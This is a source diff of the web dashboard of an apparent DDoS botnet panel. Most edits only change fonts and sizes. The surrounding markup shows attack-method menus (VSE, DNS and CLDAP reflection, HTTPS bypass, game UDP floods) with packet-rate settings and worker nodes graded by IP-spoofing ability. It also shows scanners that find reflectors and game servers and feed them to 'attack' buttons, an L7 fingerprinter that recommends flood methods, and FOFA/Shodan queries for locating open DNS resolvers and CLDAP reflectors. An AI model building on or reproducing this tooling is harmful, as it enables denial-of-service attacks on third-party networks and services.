@@ -8,18 +8,23 @@
 <style>
   :root { --bg:#0a0e14; --panel:#131820; --border:#1e2836; --text:#b0b8c4; --green:#0c6; --red:#f44; --yellow:#fa0; --cyan:#0cc; --accent:#3b82f6; }
   * { box-sizing:border-box; margin:0; padding:0; }
-  body { background:var(--bg); color:var(--text); font-family:'SF Mono','Consolas',monospace; font-size:13px; }
+  /* 系统 UI 字体：Win 下 Segoe UI + 微软雅黑（ClearType 渲染清晰），
+     macOS 自动苹方；14px 基准在高分屏（2K/4K）下可读性更好 */
+  body { background:var(--bg); color:var(--text); font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Microsoft YaHei','PingFang SC','Noto Sans SC',sans-serif; font-size:14px; }
+  /* 代码/命令/日志/数字统计保留等宽（Cascadia Code 比 Consolas 清晰） */
+  code, pre, .worker-cmd, .log, .log-line, .mono { font-family:'Cascadia Code',Consolas,'Courier New',monospace; }
+  .stat-card .value { font-variant-numeric:tabular-nums; }
   .header { background:var(--panel); border-bottom:1px solid var(--border); padding:12px 20px; display:flex; justify-content:space-between; align-items:center; }
   .header h1 { color:var(--cyan); font-size:16px; }
-  .lang-btn { background:transparent; border:1px solid var(--border); color:var(--text); padding:4px 10px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; }
+  .lang-btn { background:transparent; border:1px solid var(--border); color:var(--text); padding:4px 10px; border-radius:4px; cursor:pointer; font-size:12px; font-family:inherit; }
   .lang-btn:hover { border-color:var(--accent); color:var(--cyan); }
   .lang-btn.active { border-color:var(--accent); color:var(--cyan); background:var(--accent); color:#fff; }
   .layout { display:grid; grid-template-columns:repeat(2, minmax(0,1fr)); gap:12px; padding:12px; max-width:1400px; margin:0 auto; }
   .panel { background:var(--panel); border:1px solid var(--border); border-radius:6px; padding:14px; min-width:0; }
-  .panel h2 { color:var(--cyan); font-size:13px; margin-bottom:10px; text-transform:uppercase; letter-spacing:1px; }
+  .panel h2 { color:var(--cyan); font-size:14px; margin-bottom:10px; text-transform:uppercase; letter-spacing:1px; }
   .panel.full { grid-column:1/-1; }
   table { width:100%; border-collapse:collapse; }
-  th, td { text-align:left; padding:6px 8px; border-bottom:1px solid var(--border); font-size:12px; }
+  th, td { text-align:left; padding:6px 8px; border-bottom:1px solid var(--border); font-size:13px; }
   th { color:var(--text); opacity:0.7; font-weight:normal; }
   .status { display:inline-block; width:7px; height:7px; border-radius:50%; margin-right:6px; }
   .status.online,.status.READY { background:var(--green); }
@@ -28,13 +33,13 @@
   .status.running { background:var(--accent); animation:pulse 1s infinite; }
   .status.completed { background:var(--green); }
   @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
-  .btn { background:var(--accent); color:#fff; border:none; padding:6px 14px; border-radius:4px; cursor:pointer; font-size:11px; font-family:inherit; }
-  .btn.sm { padding:3px 10px; font-size:10px; }
-  .pager { display:flex; align-items:center; justify-content:flex-end; gap:8px; margin-top:10px; font-size:11px; opacity:0.8; }
+  .btn { background:var(--accent); color:#fff; border:none; padding:6px 14px; border-radius:4px; cursor:pointer; font-size:12px; font-family:inherit; }
+  .btn.sm { padding:3px 10px; font-size:12px; }
+  .pager { display:flex; align-items:center; justify-content:flex-end; gap:8px; margin-top:10px; font-size:12px; opacity:0.8; }
   .pager .btn:disabled { opacity:0.35; cursor:default; }
   .btn.danger { background:var(--red); }
   .btn:hover { opacity:0.85; }
-  input, select, textarea { background:var(--bg); border:1px solid var(--border); color:var(--text); padding:6px 10px; border-radius:4px; font-size:12px; font-family:inherit; width:100%; margin-bottom:6px; }
+  input, select, textarea { background:var(--bg); border:1px solid var(--border); color:var(--text); padding:6px 10px; border-radius:4px; font-size:13px; font-family:inherit; width:100%; margin-bottom:6px; }
   input:focus, select:focus, textarea:focus { outline:none; border-color:var(--accent); }
   textarea { resize:vertical; min-height:120px; }
   .form-row { display:flex; gap:8px; }
@@ -42,11 +47,11 @@
   .stats-grid { display:grid; grid-template-columns:repeat(4, minmax(0,1fr)); gap:10px; margin-bottom:12px; }
   .stat-card { background:var(--bg); border:1px solid var(--border); border-radius:4px; padding:10px; text-align:center; min-width:0; overflow:hidden; }
   .stat-card .value { font-size:22px; font-weight:bold; color:var(--cyan); }
-  .stat-card .label { font-size:10px; color:var(--text); opacity:0.6; margin-top:4px; }
+  .stat-card .label { font-size:12px; color:var(--text); opacity:0.6; margin-top:4px; }
   .scan-row { display:flex; gap:8px; align-items:flex-end; }
   .scan-row > * { flex:1; }
   .scan-row .btn { flex:0; white-space:nowrap; }
-  .log { max-height:200px; overflow-y:auto; font-size:11px; }
+  .log { max-height:200px; overflow-y:auto; font-size:12px; }
   .log-line { padding:2px 0; border-bottom:1px solid var(--border); }
   .login-overlay { position:fixed; top:0;left:0;width:100%;height:100%;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:999; }
   .login-box { background:var(--panel); border:1px solid var(--border); border-radius:8px; padding:30px; width:380px; text-align:center; }
@@ -54,12 +59,12 @@
   .login-box input { text-align:center; font-size:14px; padding:10px; }
   .login-box .btn { width:100%; padding:10px; font-size:14px; margin-top:8px; }
   .login-error { color:var(--red); font-size:12px; margin-top:8px; }
-  .worker-cmd { background:var(--bg); border:1px solid var(--border); border-radius:4px; padding:10px; font-size:11px; color:var(--green); white-space:nowrap; overflow-x:auto; margin-top:6px; -webkit-user-select:all; user-select:all; }
+  .worker-cmd { background:var(--bg); border:1px solid var(--border); border-radius:4px; padding:10px; font-size:12px; color:var(--green); white-space:nowrap; overflow-x:auto; margin-top:6px; -webkit-user-select:all; user-select:all; }
   .deploy-opt { display:flex; align-items:center; gap:6px; cursor:pointer; }
   .deploy-opt input[type="checkbox"] { width:auto; flex:0 0 auto; margin:0; }
   .progress-bar { height:4px; background:var(--bg); border-radius:2px; overflow:hidden; margin-top:2px; }
   .progress-fill { height:100%; background:var(--accent); transition:width 0.3s; }
-  .warning { color:var(--yellow); font-size:11px; margin-top:4px; }
+  .warning { color:var(--yellow); font-size:12px; margin-top:4px; }
   .modal-overlay { position:fixed; top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:1000; }
   .modal { background:var(--panel); border:1px solid var(--border); border-radius:8px; padding:14px; width:480px; max-width:92vw; max-height:80vh; display:flex; flex-direction:column; }
   .modal h3 { color:var(--cyan); }
@@ -179,7 +184,7 @@
     <div style="display:flex;gap:6px;margin-bottom:6px;align-items:center">
       <button type="button" class="btn" @click="openNodePicker()" style="flex:1;justify-content:space-between;display:flex;align-items:center">
         <span x-text="t('target_nodes')"></span>
-        <span style="font-size:11px;opacity:0.8">
+        <span style="font-size:12px;opacity:0.8">
           <span x-show="!selectedNodes.length || selectedNodes.length===nodes.length" x-text="t('all_nodes')"></span>
           <span x-show="selectedNodes.length && selectedNodes.length!==nodes.length" x-text="selectedNodes.length + '/' + nodes.length"></span>
         </span>      </button>
@@ -200,31 +205,31 @@
         </div>
         <div style="max-height:300px;overflow-y:auto;border:1px solid var(--border);border-radius:4px">
           <template x-for="n in filteredNodes" :key="n.worker_id">
-            <label style="display:flex;align-items:center;gap:6px;padding:5px 8px;cursor:pointer;border-bottom:1px solid var(--border);font-size:11px">
+            <label style="display:flex;align-items:center;gap:6px;padding:5px 8px;cursor:pointer;border-bottom:1px solid var(--border);font-size:12px">
               <input type="checkbox" :value="n.worker_id" x-model="selectedNodes" style="width:auto;margin:0">
-              <span x-text="n.worker_id" style="color:var(--cyan);font-size:10px;flex:1"></span>
-              <span x-text="n.ip || '-'" style="opacity:0.6;font-size:10px"></span>
-              <span x-show="n.spoof_tested && n.can_spoof" style="color:var(--green);font-size:10px" x-text="t('spoof_yes')"></span>
-              <span x-show="n.spoof_tested && !n.can_spoof" style="color:#f66;font-size:10px" x-text="t('spoof_no')"></span>
-              <span x-show="!n.spoof_tested" style="color:#fa0;font-size:10px" x-text="t('spoof_pending')"></span>
+              <span x-text="n.worker_id" style="color:var(--cyan);font-size:12px;flex:1"></span>
+              <span x-text="n.ip || '-'" style="opacity:0.6;font-size:12px"></span>
+              <span x-show="n.spoof_tested && n.can_spoof" style="color:var(--green);font-size:12px" x-text="t('spoof_yes')"></span>
+              <span x-show="n.spoof_tested && !n.can_spoof" style="color:#f66;font-size:12px" x-text="t('spoof_no')"></span>
+              <span x-show="!n.spoof_tested" style="color:#fa0;font-size:12px" x-text="t('spoof_pending')"></span>
             </label>
           </template>
-          <div x-show="filteredNodes.length===0" style="padding:12px;text-align:center;opacity:0.5;font-size:11px" x-text="t('node_no_match')"></div>
+          <div x-show="filteredNodes.length===0" style="padding:12px;text-align:center;opacity:0.5;font-size:12px" x-text="t('node_no_match')"></div>
         </div>
         <div style="margin-top:8px;border:1px solid var(--border);border-radius:4px;padding:6px">
-          <div style="font-size:10px;color:var(--cyan);margin-bottom:4px" x-text="t('node_groups')"></div>
+          <div style="font-size:12px;color:var(--cyan);margin-bottom:4px" x-text="t('node_groups')"></div>
           <div style="display:flex;flex-wrap:wrap;gap:4px;margin-bottom:6px" x-show="Object.keys(nodeGroups).length>0">
             <template x-for="(members, name) in nodeGroups" :key="name">
               <button class="btn sm" @click="selectNodeGroup(name)" style="padding:2px 8px" x-text="name + ' (' + members.length + ')'"></button>
             </template>
           </div>
-          <div x-show="Object.keys(nodeGroups).length===0" style="font-size:10px;opacity:0.5;margin-bottom:4px" x-text="t('no_groups')"></div>
+          <div x-show="Object.keys(nodeGroups).length===0" style="font-size:12px;opacity:0.5;margin-bottom:4px" x-text="t('no_groups')"></div>
           <div style="display:flex;gap:4px;align-items:center">
-            <input x-model="newGroupName" :placeholder="t('group_name_ph')" style="flex:1;margin:0;font-size:10px">
+            <input x-model="newGroupName" :placeholder="t('group_name_ph')" style="flex:1;margin:0;font-size:12px">
             <button class="btn sm" @click="saveNodeGroup()" x-text="t('save_group')" style="flex:0;white-space:nowrap"></button>
           </div>
         </div>
-        <div style="margin-top:8px;font-size:10px;opacity:0.6" x-text="t('node_picker_tip')"></div>
+        <div style="margin-top:8px;font-size:12px;opacity:0.6" x-text="t('node_picker_tip')"></div>
       </div>
     </div>
     <div class="form-row">
@@ -236,12 +241,12 @@
     <!-- Combo Sub-Attacks Panel -->
     <div x-show="form.method === 'combo'" style="border:1px solid var(--border);border-radius:4px;padding:8px;margin-bottom:6px">
       <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
-        <span style="font-size:11px;color:var(--cyan)" x-text="t('sub_attacks')"></span>
+        <span style="font-size:12px;color:var(--cyan)" x-text="t('sub_attacks')"></span>
         <button class="btn sm" @click="addSubAttack()" style="flex:0" x-text="'+ '+t('add')"></button>
       </div>
       <template x-for="(sub, idx) in form.sub_attacks" :key="idx">
         <div style="display:flex;gap:4px;margin-bottom:4px;align-items:center;flex-wrap:wrap">
-          <select x-model="sub.method" style="width:140px;margin:0;font-size:10px">
+          <select x-model="sub.method" style="width:140px;margin:0;font-size:12px">
             <option value="vse">VSE</option>
             <option value="vse_reflector">VSE Refl</option>
             <option value="dns_reflector">DNS Refl</option>
@@ -271,13 +276,13 @@
             <option value="https_bypass">HTTPS Bypass</option>
             <option value="game_udp">Game UDP</option>
           </select>
-          <input x-model.number="sub.threads" type="number" :placeholder="t('threads')" value="100" style="width:70px;margin:0;font-size:10px">
-          <input x-model.number="sub.packet_size" type="number" :placeholder="t('size')" value="1400" style="width:65px;margin:0;font-size:10px">
-          <input x-model.number="sub.rate_limit_pps" type="number" placeholder="PPS" value="0" style="width:65px;margin:0;font-size:10px">
-          <button class="btn sm danger" @click="removeSubAttack(idx)" style="flex:0;margin:0;font-size:10px;padding:3px 6px">X</button>
+          <input x-model.number="sub.threads" type="number" :placeholder="t('threads')" value="100" style="width:70px;margin:0;font-size:12px">
+          <input x-model.number="sub.packet_size" type="number" :placeholder="t('size')" value="1400" style="width:65px;margin:0;font-size:12px">
+          <input x-model.number="sub.rate_limit_pps" type="number" placeholder="PPS" value="0" style="width:65px;margin:0;font-size:12px">
+          <button class="btn sm danger" @click="removeSubAttack(idx)" style="flex:0;margin:0;font-size:12px;padding:3px 6px">X</button>
         </div>
       </template>
-      <div x-show="!form.sub_attacks || form.sub_attacks.length === 0" style="font-size:10px;opacity:0.5;text-align:center;padding:8px" x-text="t('no_sub_attacks')"></div>
+      <div x-show="!form.sub_attacks || form.sub_attacks.length === 0" style="font-size:12px;opacity:0.5;text-align:center;padding:8px" x-text="t('no_sub_attacks')"></div>
     </div>
 
     <div class="form-row" style="margin-bottom:6px">
@@ -285,14 +290,14 @@
       <input x-model.number="form.rate_limit_bps" type="number" :placeholder="t('bps_limit')" value="0" step="1000000">
     </div>
     <div class="form-row" style="align-items:center;margin-bottom:6px;">
-      <label style="font-size:11px;display:flex;align-items:center;gap:4px;cursor:pointer;white-space:nowrap">
+      <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;white-space:nowrap">
         <input type="checkbox" x-model="form.burst_mode" style="width:auto;margin:0;"> <span x-text="t('burst')"></span>
       </label>
-      <label style="font-size:11px;display:flex;align-items:center;gap:4px;cursor:pointer;white-space:nowrap">
+      <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;white-space:nowrap">
         <input type="checkbox" x-model="form.mix" style="width:auto;margin:0;"> <span x-text="t('mix_queries')"></span>
       </label>
       <input x-model.number="form.jitter_ms" type="number" :placeholder="t('jitter_ms')" value="0" style="max-width:80px">
-      <label style="font-size:11px;display:flex;align-items:center;gap:4px;cursor:pointer;white-space:nowrap" x-show="isReflectorMethod(form.method)">
+      <label style="font-size:12px;display:flex;align-items:center;gap:4px;cursor:pointer;white-space:nowrap" x-show="isReflectorMethod(form.method)">
         <input type="checkbox" x-model="form.fallback_to_udp" style="width:auto;margin:0;"> <span x-text="t('fallback_udp')"></span>
       </label>
     </div>
@@ -327,12 +332,12 @@
       <button class="btn" @click="runL7Test()" :disabled="l7Test.testing" x-text="t('l7_test_btn')"></button>
     </div>
     <div class="warning" x-show="l7Test.testing" x-text="t('l7_testing')"></div>
-    <div x-show="l7Test.error" style="color:var(--red);font-size:11px;margin-top:6px" x-text="l7Test.error"></div>
+    <div x-show="l7Test.error" style="color:var(--red);font-size:12px;margin-top:6px" x-text="l7Test.error"></div>
 
     <template x-if="l7Test.result">
       <div style="margin-top:10px">
         <!-- 指纹卡 -->
-        <div style="border:1px solid var(--border);border-radius:4px;padding:8px;font-size:11px">
+        <div style="border:1px solid var(--border);border-radius:4px;padding:8px;font-size:12px">
           <div style="display:flex;gap:14px;flex-wrap:wrap">
             <span><span style="opacity:0.6" x-text="t('l7_server')+': '"></span><b x-text="l7Test.result.fingerprint.server_header||'-'"></b></span>
             <span x-show="l7Test.result.fingerprint.product"><span style="opacity:0.6" x-text="t('l7_product')+': '"></span><b x-text="l7Test.result.fingerprint.product"></b></span>
@@ -349,15 +354,15 @@
           </div>
           <!-- 能力徽章（推荐依据） -->
           <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap">
-            <span x-show="l7Test.result.fingerprint.http2 || l7Test.result.fingerprint.http2c" style="background:rgba(59,130,246,.15);color:#7ab0ff;border:1px solid #3b82f6;border-radius:3px;padding:2px 8px;font-size:10px">HTTP/2</span>
-            <span x-show="l7Test.result.fingerprint.ws" style="background:rgba(59,130,246,.15);color:#7ab0ff;border:1px solid #3b82f6;border-radius:3px;padding:2px 8px;font-size:10px">WebSocket</span>
-            <span x-show="l7Test.result.fingerprint.slow_applicable" style="background:rgba(12,204,204,.12);color:#0cc;border:1px solid #0cc;border-radius:3px;padding:2px 8px;font-size:10px">无请求头超时</span>
-            <span x-show="l7Test.result.fingerprint.static_range" style="background:rgba(12,204,204,.12);color:#0cc;border:1px solid #0cc;border-radius:3px;padding:2px 8px;font-size:10px">静态/Range</span>
-            <span x-show="l7Test.result.fingerprint.tls_issuer" style="background:rgba(255,170,0,.12);color:#fa0;border:1px solid #fa0;border-radius:3px;padding:2px 8px;font-size:10px">TLS</span>
-            <span x-show="l7Test.result.fingerprint.body_size > 0" style="background:rgba(255,170,0,.12);color:#fa0;border:1px solid #fa0;border-radius:3px;padding:2px 8px;font-size:10px" x-text="'首页 '+formatNum(l7Test.result.fingerprint.body_size)+'B'"></span>
+            <span x-show="l7Test.result.fingerprint.http2 || l7Test.result.fingerprint.http2c" style="background:rgba(59,130,246,.15);color:#7ab0ff;border:1px solid #3b82f6;border-radius:3px;padding:2px 8px;font-size:12px">HTTP/2</span>
+            <span x-show="l7Test.result.fingerprint.ws" style="background:rgba(59,130,246,.15);color:#7ab0ff;border:1px solid #3b82f6;border-radius:3px;padding:2px 8px;font-size:12px">WebSocket</span>
+            <span x-show="l7Test.result.fingerprint.slow_applicable" style="background:rgba(12,204,204,.12);color:#0cc;border:1px solid #0cc;border-radius:3px;padding:2px 8px;font-size:12px">无请求头超时</span>
+            <span x-show="l7Test.result.fingerprint.static_range" style="background:rgba(12,204,204,.12);color:#0cc;border:1px solid #0cc;border-radius:3px;padding:2px 8px;font-size:12px">静态/Range</span>
+            <span x-show="l7Test.result.fingerprint.tls_issuer" style="background:rgba(255,170,0,.12);color:#fa0;border:1px solid #fa0;border-radius:3px;padding:2px 8px;font-size:12px">TLS</span>
+            <span x-show="l7Test.result.fingerprint.body_size > 0" style="background:rgba(255,170,0,.12);color:#fa0;border:1px solid #fa0;border-radius:3px;padding:2px 8px;font-size:12px" x-text="'首页 '+formatNum(l7Test.result.fingerprint.body_size)+'B'"></span>
           </div>
           <!-- 探测备注 -->
-          <div x-show="l7Test.result.fingerprint.notes && l7Test.result.fingerprint.notes.length" style="margin-top:8px;opacity:0.7;font-size:10px">
+          <div x-show="l7Test.result.fingerprint.notes && l7Test.result.fingerprint.notes.length" style="margin-top:8px;opacity:0.7;font-size:12px">
             <template x-for="(n,i) in l7Test.result.fingerprint.notes" :key="i">
               <div x-text="'• '+n"></div>
             </template>
@@ -365,12 +370,12 @@
         </div>
 
         <!-- 推荐列表 -->
-        <div style="margin-top:10px;font-size:11px;color:var(--cyan)" x-text="t('l7_recs')"></div>
+        <div style="margin-top:10px;font-size:12px;color:var(--cyan)" x-text="t('l7_recs')"></div>
         <template x-for="(rec,i) in l7Test.result.recommendations" :key="rec.method">
           <div style="display:flex;align-items:center;gap:8px;border:1px solid var(--border);border-radius:4px;padding:6px 8px;margin-top:4px">
-            <span x-show="i===0" style="color:var(--yellow);font-size:10px;white-space:nowrap" x-text="'★ '+t('l7_best')"></span>
-            <span style="color:var(--cyan);font-weight:bold;font-size:11px;min-width:170px" x-text="t('method_'+rec.method)"></span>
-            <span style="flex:1;font-size:10px;opacity:0.8" x-text="t(rec.reason_key)"></span>
+            <span x-show="i===0" style="color:var(--yellow);font-size:12px;white-space:nowrap" x-text="'★ '+t('l7_best')"></span>
+            <span style="color:var(--cyan);font-weight:bold;font-size:12px;min-width:170px" x-text="t('method_'+rec.method)"></span>
+            <span style="flex:1;font-size:12px;opacity:0.8" x-text="t(rec.reason_key)"></span>
             <button class="btn sm" @click="launchL7Rec(rec)" style="flex:0;white-space:nowrap" x-text="t('l7_launch')"></button>
           </div>
         </template>
@@ -385,7 +390,7 @@
   <!-- Target Guard -->
   <div class="panel">
     <h2 x-text="t('guard') + (guard.enabled ? ' 🛡' : ' ⚠')"></h2>
-    <div style="display:flex;flex-direction:column;gap:6px;font-size:11px;margin-bottom:8px">
+    <div style="display:flex;flex-direction:column;gap:6px;font-size:12px;margin-bottom:8px">
       <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
         <input type="checkbox" x-model="guard.enabled" style="width:auto;margin:0"> <span x-text="t('guard_enabled')"></span>
       </label>
@@ -398,27 +403,27 @@
     </div>
     <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
       <div>
-        <div style="font-size:10px;opacity:0.7;margin-bottom:2px" x-text="t('guard_blocked_ips')"></div>
-        <textarea x-model="guardText.blocked_ips" rows="2" style="min-height:36px;font-size:10px"></textarea>
-        <div style="font-size:10px;opacity:0.7;margin:4px 0 2px" x-text="t('guard_blocked_cidr')"></div>
-        <textarea x-model="guardText.blocked_cidr" rows="2" style="min-height:36px;font-size:10px"></textarea>
-        <div style="font-size:10px;opacity:0.7;margin:4px 0 2px" x-text="t('guard_blocked_domains')"></div>
-        <textarea x-model="guardText.blocked_domains" rows="2" style="min-height:36px;font-size:10px"></textarea>
+        <div style="font-size:12px;opacity:0.7;margin-bottom:2px" x-text="t('guard_blocked_ips')"></div>
+        <textarea x-model="guardText.blocked_ips" rows="2" style="min-height:36px;font-size:12px"></textarea>
+        <div style="font-size:12px;opacity:0.7;margin:4px 0 2px" x-text="t('guard_blocked_cidr')"></div>
+        <textarea x-model="guardText.blocked_cidr" rows="2" style="min-height:36px;font-size:12px"></textarea>
+        <div style="font-size:12px;opacity:0.7;margin:4px 0 2px" x-text="t('guard_blocked_domains')"></div>
+        <textarea x-model="guardText.blocked_domains" rows="2" style="min-height:36px;font-size:12px"></textarea>
       </div>
       <div>
-        <div style="font-size:10px;opacity:0.7;margin-bottom:2px" x-text="t('guard_allowed_ips')"></div>
-        <textarea x-model="guardText.allowed_ips" rows="2" style="min-height:36px;font-size:10px"></textarea>
-        <div style="font-size:10px;opacity:0.7;margin:4px 0 2px" x-text="t('guard_allowed_cidr')"></div>
-        <textarea x-model="guardText.allowed_cidr" rows="2" style="min-height:36px;font-size:10px"></textarea>
-        <div style="font-size:10px;opacity:0.7;margin:4px 0 2px" x-text="t('guard_allowed_domains')"></div>
-        <textarea x-model="guardText.allowed_domains" rows="2" style="min-height:36px;font-size:10px"></textarea>
+        <div style="font-size:12px;opacity:0.7;margin-bottom:2px" x-text="t('guard_allowed_ips')"></div>
+        <textarea x-model="guardText.allowed_ips" rows="2" style="min-height:36px;font-size:12px"></textarea>
+        <div style="font-size:12px;opacity:0.7;margin:4px 0 2px" x-text="t('guard_allowed_cidr')"></div>
+        <textarea x-model="guardText.allowed_cidr" rows="2" style="min-height:36px;font-size:12px"></textarea>
+        <div style="font-size:12px;opacity:0.7;margin:4px 0 2px" x-text="t('guard_allowed_domains')"></div>
+        <textarea x-model="guardText.allowed_domains" rows="2" style="min-height:36px;font-size:12px"></textarea>
       </div>
     </div>
     <div style="display:flex;gap:8px;margin-top:8px;align-items:center">
       <button class="btn sm" @click="saveGuard()" x-text="t('guard_save')" style="flex:0;white-space:nowrap"></button>
-      <span x-show="guardMsg" style="font-size:10px;color:var(--cyan)" x-text="guardMsg"></span>
+      <span x-show="guardMsg" style="font-size:12px;color:var(--cyan)" x-text="guardMsg"></span>
     </div>
-    <div style="margin-top:6px;font-size:10px;opacity:0.6" x-text="t('guard_tip')"></div>
+    <div style="margin-top:6px;font-size:12px;opacity:0.6" x-text="t('guard_tip')"></div>
   </div>
 
   <!-- VSE Scanner -->
@@ -439,8 +444,8 @@
             <span style="color:var(--text);margin-left:8px" x-text="r.response_size + ' bytes'"></span>
             <button class="btn sm" @click="form.target = r.ip + ':' + r.port; form.method='vse'" style="margin-left:8px" x-text="t('attack')"></button>
           </div>
-          <div x-show="r.server_name" style="font-size:10px;opacity:0.7;margin-top:2px" x-text="r.server_name"></div>
-          <div x-show="r.game" style="font-size:10px;opacity:0.6">
+          <div x-show="r.server_name" style="font-size:12px;opacity:0.7;margin-top:2px" x-text="r.server_name"></div>
+          <div x-show="r.game" style="font-size:12px;opacity:0.6">
             <span x-text="r.game"></span>
             <span x-show="r.map" x-text="' | ' + r.map"></span>
             <span x-show="r.players >= 0" x-text="' | ' + r.players + '/' + r.max_players"></span>
@@ -473,19 +478,19 @@
       </template>
       <div x-show="dnsScan.scanning" style="color:var(--yellow)" x-text="t('scanning')"></div>
       <div x-show="dnsScan.error" style="color:var(--red);margin-top:6px" x-text="dnsScan.error"></div>
-      <div x-show="dnsScan.resultCount > 0 && !dnsScan.scanning" style="margin-top:4px;font-size:10px;opacity:0.6">
+      <div x-show="dnsScan.resultCount > 0 && !dnsScan.scanning" style="margin-top:4px;font-size:12px;opacity:0.6">
         <span x-text="dnsScan.resultCount"></span> <span x-text="t('resolvers_found')"></span>.
         <a href="#" @click.prevent="addAllToDNSPool()" style="color:var(--accent)" x-text="t('add_all_to_pool')"></a>
       </div>
     </div>
-    <details style="margin-top:10px;font-size:11px;opacity:0.7">
+    <details style="margin-top:10px;font-size:12px;opacity:0.7">
       <summary style="cursor:pointer;color:var(--cyan)" x-text="t('fofa_tips')"></summary>
       <div style="margin-top:6px;padding:8px;background:var(--bg);border-radius:4px">
         <div style="margin-bottom:6px;font-weight:bold;color:var(--accent)">FOFA:</div>
         <code style="display:block;margin-bottom:4px;word-break:break-all">port="53" &amp;&amp; protocol="dns" &amp;&amp; (country="US" || country="JP" || country="KR" || country="DE" || country="GB" || country="NL" || country="FR" || country="SG")</code>
         <div style="margin:6px 0;font-weight:bold;color:var(--accent)">Shodan:</div>
         <code style="display:block;margin-bottom:4px">port:53 country:"US","JP","KR","DE","GB","NL","FR","SG"</code>
-        <div style="margin-top:6px;color:var(--text);font-size:10px" x-text="t('fofa_export_tip')"></div>
+        <div style="margin-top:6px;color:var(--text);font-size:12px" x-text="t('fofa_export_tip')"></div>
       </div>
     </details>
   </div>
@@ -494,14 +499,14 @@
   <div class="panel">
     <h2 x-text="t('worker_nodes') + ' (' + nodes.length + ')'"></h2>
     <div style="display:flex;gap:6px;margin-bottom:8px;align-items:center">
-      <span style="font-size:10px;opacity:0.7;white-space:nowrap" x-text="t('region_filter')"></span>
+      <span style="font-size:12px;opacity:0.7;white-space:nowrap" x-text="t('region_filter')"></span>
       <select x-model="regionFilter" style="width:auto;margin:0;flex:0 0 130px">
         <option value="" x-text="t('all_regions')"></option>
         <template x-for="r in nodeRegions" :key="r">
           <option :value="r" x-text="r"></option>
         </template>
       </select>
-      <span style="font-size:10px;opacity:0.6" x-text="regionFilter ? (regionFilteredNodes.length + '/' + nodes.length) : ''"></span>
+      <span style="font-size:12px;opacity:0.6" x-text="regionFilter ? (regionFilteredNodes.length + '/' + nodes.length) : ''"></span>
     </div>
     <!-- 节点类型切换：全部 / Go worker / LW（轻量伪造节点） -->
     <div style="display:flex;gap:4px;margin-bottom:8px">
@@ -514,17 +519,17 @@
       <tbody>
         <template x-for="n in pagedNodes" :key="n.worker_id">
           <tr>
-            <td x-text="n.worker_id" style="color:var(--cyan);font-size:11px"></td>
+            <td x-text="n.worker_id" style="color:var(--cyan);font-size:12px"></td>
             <td x-text="n.ip || '-'"></td>
             <td>
-              <span style="color:var(--yellow);font-size:10px" x-text="n.location || '-'"></span>
+              <span style="color:var(--yellow);font-size:12px" x-text="n.location || '-'"></span>
               <span x-show="isLW(n)" style="color:var(--accent);font-size:9px;border:1px solid var(--accent);border-radius:3px;padding:0 4px;margin-left:4px">LW</span>
             </td>
             <td x-text="n.platform || (n.is_windows ? 'Windows' : 'Linux')"></td>
             <td>
-              <span x-show="n.spoof_tested && n.can_spoof" style="color:var(--green);font-size:10px" x-text="t('spoof_yes')"></span>
-              <span x-show="n.spoof_tested && !n.can_spoof" style="color:#f66;font-size:10px" x-text="t('spoof_no')"></span>
-              <span x-show="!n.spoof_tested" style="color:#fa0;font-size:10px" x-text="t('spoof_pending')"></span>
+              <span x-show="n.spoof_tested && n.can_spoof" style="color:var(--green);font-size:12px" x-text="t('spoof_yes')"></span>
+              <span x-show="n.spoof_tested && !n.can_spoof" style="color:#f66;font-size:12px" x-text="t('spoof_no')"></span>
+              <span x-show="!n.spoof_tested" style="color:#fa0;font-size:12px" x-text="t('spoof_pending')"></span>
             </td>
             <td x-text="(n.cpu_percent||0) + '%'"></td>
             <td x-text="(n.memory_mb||0) + ' MB'"></td>
@@ -549,7 +554,7 @@
       <tbody>
         <template x-for="t in tasks" :key="t.task_id">
           <tr>
-            <td style="color:var(--cyan);font-size:10px" x-text="t.task_id.slice(-8)"></td>
+            <td style="color:var(--cyan);font-size:12px" x-text="t.task_id.slice(-8)"></td>
             <td x-text="t.target"></td>
             <td x-text="t.method"></td>
             <td x-text="Object.keys(t.workers || {}).length"></td>
@@ -559,7 +564,7 @@
               <div class="progress-bar" x-show="t.status=='running'">
                 <div class="progress-fill" :style="'width:' + taskProgress(t) + '%'"></div>
               </div>
-              <span x-show="t.status=='running'" style="font-size:10px;opacity:0.6" x-text="taskTimeLeft(t)"></span>
+              <span x-show="t.status=='running'" style="font-size:12px;opacity:0.6" x-text="taskTimeLeft(t)"></span>
             </td>
             <td>
               <div style="display:flex;gap:4px">
@@ -594,19 +599,19 @@
       </template>
       <div x-show="cldapScan.scanning" style="color:var(--yellow)" x-text="t('scanning')"></div>
       <div x-show="cldapScan.error" style="color:var(--red);margin-top:6px" x-text="cldapScan.error"></div>
-      <div x-show="cldapScan.resultCount > 0 && !cldapScan.scanning" style="margin-top:4px;font-size:10px;opacity:0.6">
+      <div x-show="cldapScan.resultCount > 0 && !cldapScan.scanning" style="margin-top:4px;font-size:12px;opacity:0.6">
         <span x-text="cldapScan.resultCount"></span> <span x-text="t('reflectors_found')"></span>.
         <a href="#" @click.prevent="addAllToCLDAPPool()" style="color:var(--accent)" x-text="t('add_all_to_cldap')"></a>
       </div>
     </div>
-    <details style="margin-top:10px;font-size:11px;opacity:0.7">
+    <details style="margin-top:10px;font-size:12px;opacity:0.7">
       <summary style="cursor:pointer;color:var(--cyan)" x-text="t('fofa_tips')"></summary>
       <div style="margin-top:6px;padding:8px;background:var(--bg);border-radius:4px">
         <div style="margin-bottom:6px;font-weight:bold;color:var(--accent)">FOFA:</div>
         <code style="display:block;margin-bottom:4px;word-break:break-all">port="389" &amp;&amp; protocol="cldap"</code>
         <div style="margin:6px 0;font-weight:bold;color:var(--accent)">Shodan:</div>
         <code style="display:block">port:389 ldap</code>
